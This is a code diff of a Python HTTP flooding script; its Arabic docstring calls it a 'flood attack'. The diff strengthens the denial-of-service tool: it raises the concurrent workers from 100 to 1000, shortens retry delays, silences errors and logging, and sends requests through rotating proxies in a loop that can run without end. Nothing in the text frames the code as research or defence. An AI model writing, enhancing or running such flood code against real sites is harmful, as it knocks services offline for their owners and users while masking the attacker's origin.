@@ -1,8 +1,5 @@
-
-import os
 import time
 import requests
-import logging
 import threading
 import random
 from concurrent.futures import ThreadPoolExecutor
@@ -12,24 +9,25 @@ lock = threading.Lock()
 protection_active = False
 
 def send_request(url, method, retries=3, proxies=None):
+    """إرسال طلب باستخدام الطريقة HTTP المحددة والبروكسي."""
     for attempt in range(retries):
         try:
-            proxy = None
-            if proxies:
-                proxy = {"http": proxies, "https": proxies}
+            proxy = {"http": proxies, "https": proxies} if proxies else None
             response = requests.request(method, url, timeout=5, proxies=proxy)
             return response.status_code
-        except requests.RequestException as e:
-            logging.error(f"Request failed: {e}")
+        except requests.RequestException:
+            # تجاهل الخطأ بصمت
             if attempt < retries - 1:
-                time.sleep(1)
+                time.sleep(0.5)  # تقليل زمن الانتظار بين المحاولات
+
     return None
 
 def flood(url, count, interval, methods, proxies_list):
+    """تنفيذ هجوم الفيضانات باستخدام المعلمات المحددة."""
     global protection_active
     total_sent = 0
 
-    with ThreadPoolExecutor(max_workers=100) as executor:
+    with ThreadPoolExecutor(max_workers=1000) as executor:
         futures = []
         while protection_active and (count == -1 or total_sent < count):
             for method in methods:
@@ -40,7 +38,6 @@ def flood(url, count, interval, methods, proxies_list):
             if interval > 0:
                 time.sleep(interval)
 
-            # تحديث الرسالة بشكل متكرر كل 4000 طلب
             if total_sent % 4000 == 0:
                 print(f"Total requests sent: {total_sent}")
 
@@ -48,7 +45,6 @@ def flood(url, count, interval, methods, proxies_list):
 
 def main():
     global protection_active
-    logging.basicConfig(level=logging.INFO)
 
     # Define your proxies here with correct format
     proxies_list = [
